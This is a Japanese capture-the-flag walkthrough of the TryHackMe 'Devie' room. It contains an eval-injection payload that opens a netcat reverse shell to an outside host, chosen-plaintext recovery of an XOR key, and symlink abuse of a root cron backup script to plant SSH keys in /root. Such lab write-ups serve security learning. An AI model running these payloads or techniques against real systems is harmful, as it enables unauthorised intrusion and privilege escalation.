# Devie CTF

https://tryhackme.com/room/devie

## Enumeration

```shell
TARGET=10.49.146.123
sudo bash -c "echo $TARGET   devie >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
5000/tcp open  upnp    syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,5000 $TARGET

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
5000/tcp open  upnp?
```

5000ポートは、アクセスするとHTTP。

```sh
root@ip-10-49-91-137:~# nikto -p 5000 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.49.146.123
+ Target Hostname:    devie
+ Target Port:        5000
+ Start Time:         2025-12-12 01:29:20 (GMT0)
---------------------------------------------------------------------------
+ Server: Werkzeug/2.1.2 Python/3.8.10
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
+ 1707 items checked: 0 error(s) and 2 item(s) reported on remote host
+ End Time:           2025-12-12 01:29:23 (GMT0) (3 seconds)
---------------------------------------------------------------------------
```

## math

/static/source.zip でソースコードをダウンロードできた。

```sh
$ ls
app.py  bisection.py  prime.py  quadratic.py  templates
```

### app.py

```python
from quadratic import InputForm1
from prime import InputForm2
from bisection import InputForm3
from flask import Flask, request, render_template
import math

app = Flask(__name__)

@app.route('/', methods=['GET','POST']) #Applies to get GET when we load the site and POST
def index():
    form1 = InputForm1(request.form) #Calling the class from the model.py. This is where the GET comes from
    form2 = InputForm2(request.form)
    form3 = InputForm3(request.form)
    if request.method == 'POST' and form1.validate(): 
        result1, result2 = compute(form1.a.data, form1.b.data,form1.c.data) #Calling the variables from the form
        pn = None
        root = None
    elif request.method == 'POST' and form2.validate(): 
        pn = primef(form2.number.data)
        result1 = None
        result2 = None
        root = None
    elif request.method == 'POST' and form3.validate():
        root = bisect(form3.xa.data, form3.xb.data)
        pn = None
        result1 = None
        result2 = None
    else:
        result1 = None #Otherwise is none so no display
        result2 = None
        pn = None
        root = None
    return render_template('index.html',form1=form1, form2=form2, form3=form3, result1=result1, result2=result2,pn = pn, root=root) #Display the page

@app.route("/")
def compute(a,b,c):
    disc = b*b - 4*a*c
    n_format = "{0:.2f}" #Format to 2 decimal spaces
    if disc > 0:
        result1 = (-b + math.sqrt(disc)) / 2*a
        result2 = (-b - math.sqrt(disc)) / 2*a
        result1 = float(n_format.format(result1))
        result2 = float(n_format.format(result2))
    elif disc == 0:
        result1 = (-b + math.sqrt(disc)) / 2*a
        result2 = None
        result1 = float(n_format.format(result1))
    else:
        result1 = "" #Empty string for the purpose of no real roots
        result2 = ""
    return result1, result2

@app.route("/")
def primef(n):
    pc = 0
    n = int(n)
    for i in range(2,n): #From 2 up to the number
        p = n % i #Get the remainder
        if p == 0: #If it equals 0
            pc = 1 #Then its not prime and break the loop
            break
    if pc == 1:
        pn = 1
        return pn
    elif pc == 0:
        pn = 0
        return pn

@app.route("/")
def bisect(xa,xb):
    added = xa + " + " + xb
    c = eval(added)
    c = int(c)/2
    ya = (int(xa)**6) - int(xa) - 1 #f(a)
    yb = (int(xb)**6) - int(xb) - 1 #f(b)
    
    if ya > 0 and yb > 0: #If they are both positive, since we are checking for one root between the points, not two. Then if both positive, no root
        root = 0
        return root
    else:
        e = 0.0001 #When to stop checking, number is really small

        l = 0 #Loop
        while l < 1: #Endless loop until condition is met
            d = int(xb) - c #Variable d to check for e
            if d <= e: #If d < e then we break the loop
                l = l + 1
            else:
                yc = (c**6) - c - 1 #f(c)
                if yc > 0: #If f(c) is positive then we switch the b variable with c and get the new c variable
                    xb = c
                    c = (int(xa) + int(xb))/2
                elif yc < 0: #If (c) is negative then we switch the a variable instead
                    xa = c 
                    c = (int(xa) + int(xb))/2
        c_format = "{0:.4f}"
        root = float(c_format.format(c))
        return root
    
if __name__=="__main__":
    app.run("0.0.0.0",5000)
```

### モジュール

デフォルト値と、入力必須のvalidatorが設定されているだけ。  
bisection のみ、StringFieldになっている。

#### quadratic.py

```python
from wtforms import Form, FloatField, validators

class InputForm1(Form):
    a = FloatField(default=1,validators=[validators.InputRequired()])
    b = FloatField(default=3,validators=[validators.InputRequired()])
    c = FloatField(default=1,validators=[validators.InputRequired()])
```

#### prime.py

```python
from wtforms import Form, FloatField, validators

class InputForm2(Form):
    number = FloatField(default=3,validators=[validators.InputRequired()])
```

#### bisection.py

```python
from wtforms import Form, StringField, validators

class InputForm3(Form):
    xa = StringField(default=1,validators=[validators.InputRequired()])
    xb = StringField(default=3,validators=[validators.InputRequired()])
```

### templates/index.html

```html
  <body>
    <p id="title">Math Formulas</p>

    <main>
      <section>  <!-- Sections within the main -->

                                <h3 id="titles"> Feel free to use any of the calculators below:</h3>
        <br>
                                <article> <!-- Sections within the section -->

          <h4 id="titles">Quadratic formula</h4> 
          
          <form method="post" action="">
            <table id=qtables>
              {% for field in form1 %}
                <tr>
                <td>{{ field.name }} =</td><td>{{ field }}</td> <!-- each field within the form -->
                </tr>
              {% endfor %}
            </table>
            <p id=results>
              {% if result1 and result2 != None %} <!-- if conditions for displays -->
                The roots are {{ result1 }} and {{result2}}
              {% endif %}
              {% if result1 != None and result2 == None %}
                The root is {{ result1 }}
              {% endif %}
              {% if result1 == "" and result2 == "" %}
                There equation has no real roots
              {% endif %}
            </p>
              <div class="button"><input type="submit" value="Submit"></div>
          
          </form>

          <br>

                                </article>

                                <article>
                                        <h4 id="titles">Prime Numbers</h4>

          <form method="post" action="">
            <div id=stitles> Enter a number to see if it's prime</div>
            <table id=ptables>
              {% for field in form2 %}
                <tr>
                <td>{{ field }}</td>
                </tr>
              {% endfor %}
            </table>
            <p id=results>
              {% if pn == 1 %}
                The number is not prime.
              {% endif %}
              {% if pn == 0 %}
                The number is prime.
              {% endif %}
            </p>
              <div class="button"><input type="submit" value="Submit"></div>
          
          </form>
        </article>

        <br>

        <article>

          <h4 id="titles">Bisection Method</h4>
          
          <form method="post" action="">
            <div id=stitles> The formula is x^6 - x - 1</div>
            <table id=qtables>
              {% for field in form3 %}
                <tr>
                <td>{{ field.name }} =</td><td>{{ field }}</td>
                </tr>
              {% endfor %}
            </table>
            <p id=results>
              {% if root != None %}
                
                {% if root == 0 %}
                  There is no root!
                {% endif %}
                {% if root != 0 %}
                  The roots is {{root}}
                {% endif %}

              {% endif %}
            </p>
              <div class="button"><input type="submit" value="Submit"></div>
          
          </form>
          <br>
              <p style="text-align:center">Download the source code from <a align="center"href="static/source.zip" download>here</a></p>

        </article>
                        </section>

    </main>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
  </body>
```

## bisect

xa, xb は文字列型であり、eval を実行しているため、ここに脆弱性があると思われる。

```python
def bisect(xa,xb):
    added = xa + " + " + xb
    c = eval(added)
```

ペイロード

```
xa=__import__('os').system('busybox nc 192.168.138.236 8888 -e sh')#&xb=x
```

リバースシェル取得成功

```sh
$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [192.168.138.236] from (UNKNOWN) [10.49.146.123] 48416
id
uid=1000(bruce) gid=1000(bruce) groups=1000(bruce)
```

## 権限昇格１

```sh
bruce@ip-10-49-146-123:~$ pwd
/home/bruce

bruce@ip-10-49-146-123:~$ ls -al
total 44
drwxr-xr-x 4 bruce bruce 4096 Feb 20  2023 .
drwxr-xr-x 5 root  root  4096 Dec 12 01:20 ..
lrwxrwxrwx 1 root  root     9 May 13  2022 .bash_history -> /dev/null
-rw-r--r-- 1 bruce bruce  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 bruce bruce 3771 Feb 25  2020 .bashrc
drwx------ 2 bruce bruce 4096 May 12  2022 .cache
-rw-r--r-- 1 root  root   158 Feb 19  2023 checklist
-rw-r----- 1 root  bruce   23 May 12  2022 flag1.txt
-rw-r--r-- 1 root  root   355 Feb 20  2023 note
-rw-r--r-- 1 bruce bruce  807 Feb 25  2020 .profile
-rw-rw-r-- 1 bruce bruce   75 May 12  2022 .selected_editor
drwx------ 2 bruce bruce 4096 May 12  2022 .ssh
-rw------- 1 bruce bruce    0 May 12  2022 .viminfo
```

```sh
bruce@ip-10-49-146-123:~$ cat checklist
Web Application Checklist:
1. Built Site - check
2. Test Site - check
3. Move Site to production - check
4. Remove dangerous fuctions from site - check
Bruce
```

パスワードのエンコードに関する説明。

- XOR暗号
- キーは長い

```sh
bruce@ip-10-49-146-123:~$ cat note
Hello Bruce,

I have encoded my password using the super secure XOR format.

I made the key quite lengthy and spiced it up with some base64 at the end to make it even more secure. I'll share the decoding script for it soon. However, you can use my script located in the /opt/ directory.

For now look at this super secure string:
[REDACTED]

Gordon
```

スクリプトは読めない。

```sh
bruce@ip-10-49-146-123:~$ ls -al /opt
total 12
drwxr-xr-x  2 root root   4096 Aug  2  2022 .
drwxr-xr-x 19 root root   4096 Dec 12 01:20 ..
-rw-r-----  1 root gordon  485 Aug  2  2022 encrypt.py
```

sudo で実行することは可能。

```sh
bruce@ip-10-49-146-123:~$ sudo -l
Matching Defaults entries for bruce on ip-10-49-146-123:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bruce may run the following commands on ip-10-49-146-123:
    (gordon) NOPASSWD: /usr/bin/python3 /opt/encrypt.py
```

均一な文字列を変換させて、パターンを探る。

```sh
bruce@ip-10-49-146-123:~$ sudo -u gordon /usr/bin/python3 /opt/encrypt.py
Enter a password to encrypt: 11111111111111111111111111111111111111111111
QkRBVENCVFJDVEVaVEhJXkNJXkNCREFUQ0JUUkNURVpUSEleQ0leQ0JEQVQ=
```

`42444154434254524354455a5448495e43495e43` がループしている。キーは20バイトとわかる。

```sh
42444154434254524354455a5448495e43495e4342444154434254524354455a5448495e43495e4342444154
```

`11111111111111111111` と `42444154434254524354455a5448495e43495e43` のXORを、[オンライン](https://md5decrypt.net/en/Xor/)で計算してキーが判明。

そのキーを使って、Base64文字列を復号したらgordonのパスワードになった。SSH接続可能。

## 権限昇格２

/usr/bin/backup が gordon グループになっている。

```sh
gordon@ip-10-49-146-180:~$ find / -group gordon -type f -not -path "/proc/*" 2>/dev/null
/opt/encrypt.py
/usr/bin/backup
```

gordon ディレクトリの中でファイルをコピーするスクリプト。

```sh
gordon@ip-10-49-146-180:~$ ls -al /usr/bin/backup
-rwxr----- 1 root gordon 66 May 12  2022 /usr/bin/backup

gordon@ip-10-49-146-180:~$ cat /usr/bin/backup
#!/bin/bash

cd /home/gordon/reports/

cp * /home/gordon/backups/
```

pspy で監視すると、root ユーザーが実行している。

```sh
2025/12/12 04:42:01 CMD: UID=0     PID=1318   | /usr/sbin/CRON -f 
2025/12/12 04:42:01 CMD: UID=0     PID=1319   | 
2025/12/12 04:42:01 CMD: UID=0     PID=1320   | /usr/bin/bash /usr/bin/backup 
2025/12/12 04:42:01 CMD: UID=0     PID=1321   | cp report1 report2 report3 /home/gordon/backups/
```

下記のようにしても、コピーはされるがパーミッションは変わらないので読めない。

```sh
gordon@ip-10-49-146-180:~$ cd reports
gordon@ip-10-49-146-180:~/reports$ ln -s /etc/shadow shadow
```

reports ディレクトリを /root へのリンクに置き換えても、root.txt がコピーはされるが、同じくパーミッションはそのままなので読めない。

```sh
gordon@ip-10-49-146-180:~$ rm -rf ./reports
gordon@ip-10-49-146-180:~$ ln -s /root reports

gordon@ip-10-49-146-180:~$ ls -al ./backups
total 12
drwxrwx--- 2 gordon gordon 4096 Dec 12 04:54 .
drwxr-xr-x 5 gordon gordon 4096 Dec 12 04:53 ..
-rw-r----- 1 root   root     21 Dec 12 04:54 root.txt
```

authorized_keys を /root/.ssh にコピーできるか？

```sh
gordon@ip-10-49-146-180:~$ nano ./reports/authorized_keys
gordon@ip-10-49-146-180:~$ rm -rf ./backups
gordon@ip-10-49-146-180:~$ ln -s /root/.ssh backups
```

成功！

```sh
$ ssh root@10.49.146.180 -i ./id_rsa 
...
root@ip-10-49-146-180:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- 一つ一つ地道にロジックを積み上げていけばクリアできるBOXで楽しかった。
- XOR暗号は、暗号文からキーを割り出すことは不可能だが、自由な入力を許すと一発で割れてしまうので注意が必要と実感。

## Tags

#tags:コードインジェクション #tags:XOR暗号
